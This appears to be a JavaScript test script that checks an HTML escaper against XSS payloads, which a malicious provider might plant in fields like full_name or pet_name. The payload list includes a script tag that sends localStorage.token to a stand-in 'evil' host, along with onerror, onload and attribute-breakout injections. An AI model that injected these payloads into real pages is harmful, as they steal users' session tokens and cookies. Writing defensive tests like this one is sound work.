// Exercises the escaper against the payloads a malicious provider could put in
// full_name, hospital_name, pet_name and so on.
const esc = (v) => String(v ?? '')
  .replaceAll('&', '&amp;')
  .replaceAll('<', '&lt;')
  .replaceAll('>', '&gt;')
  .replaceAll('"', '&quot;')
  .replaceAll("'", '&#39;');

const payloads = [
  ['script tag',        `<script>fetch('//evil/'+localStorage.token)</script>`],
  ['img onerror',       `<img src=x onerror="alert(document.cookie)">`],
  ['svg onload',        `<svg/onload=alert(1)>`],
  ['attr breakout',     `x'); doEvil(('`],
  ['double-quote break',`x" onmouseover="alert(1)`],
  ['closing td',        `</td><td><script>alert(1)</script>`],
  ['entity double-esc', `&lt;script&gt;`],
  ['null / undefined',  null],
];

let fail = 0;
for (const [name, raw] of payloads) {
  const out = esc(raw);
  // After escaping, nothing may remain that a parser reads as markup or as a
  // quote that could terminate an attribute.
  const dangerous = /[<>"']/.test(out);
  const ok = !dangerous;
  if (!ok) fail++;
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${name.padEnd(20)} -> ${JSON.stringify(out).slice(0, 62)}`);
}

// And confirm it genuinely renders as text, not markup.
const rendered = `<td><strong>${esc(`<img src=x onerror=alert(1)>`)}</strong></td>`;
const hasLiveTag = /<img/i.test(rendered);
console.log(`${hasLiveTag ? 'FAIL' : 'PASS'}  no live <img> survives into the row`);
if (hasLiveTag) fail++;

// Sanity: the escaper must not be a no-op.
if (esc('<b>') === '<b>') { console.log('FAIL  escaper is a no-op'); fail++; }
else console.log('PASS  escaper actually transforms input');

console.log(fail ? `\n${fail} FAILED` : '\nall passed');
process.exit(fail ? 1 : 0);
